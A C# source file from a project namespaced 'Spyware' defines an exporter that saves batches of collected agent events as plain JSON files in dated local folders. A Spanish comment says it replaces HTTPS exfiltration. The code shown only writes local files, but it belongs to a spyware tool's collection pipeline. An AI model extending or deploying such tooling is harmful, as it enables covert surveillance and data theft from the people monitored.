using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.Json.Serialization;
using Spyware.Core.Configuration;
using Spyware.Core.Logging;
using Spyware.Core.Paths;

namespace Spyware.Transport;

/// <summary>Archivo local JSON, en claro: sustituye a la exfiltración HTTPS.</summary>
public sealed class LocalFolderExporter : IEventExporter
{
    private static readonly JsonSerializerOptions Options = new()
    {
        WriteIndented = true,
        Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping,
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
    };

    private readonly string _root;
    private readonly ILog _log;

    public string Name => "local-folder";

    public LocalFolderExporter(AgentPaths paths, TransportSection config, ILog log)
    {
        _root = string.IsNullOrWhiteSpace(config.ExportDirectory)
            ? paths.ExportDirectory
            : Environment.ExpandEnvironmentVariables(config.ExportDirectory.Trim());

        _log = log;
    }

    public bool Export(string agentId, IReadOnlyList<IReadOnlyDictionary<string, object?>> events)
    {
        if (events.Count == 0) return true;

        try
        {
            DateTime now = DateTime.UtcNow;
            string dayDirectory = Path.Combine(_root, now.ToString("yyyyMMdd"));
            Directory.CreateDirectory(dayDirectory);

            var envelope = new Dictionary<string, object?>
            {
                ["agent_id"] = agentId,
                ["generated_at_utc"] = now.ToString("o"),
                ["count"] = events.Count,
                ["events"] = events
            };

            string target = Path.Combine(dayDirectory, $"batch_{now:HHmmss_fff}_{Guid.NewGuid():N}.json");
            string temporary = target + ".tmp";

            File.WriteAllText(temporary, JsonSerializer.Serialize(envelope, Options));
            File.Move(temporary, target, overwrite: true);

            _log.Info($"Exportación local: {events.Count} eventos -> {target}");
            return true;
        }
        catch (Exception ex)
        {
            _log.Error("La exportación local falló; los eventos siguen pendientes.", ex);
            return false;
        }
    }
}
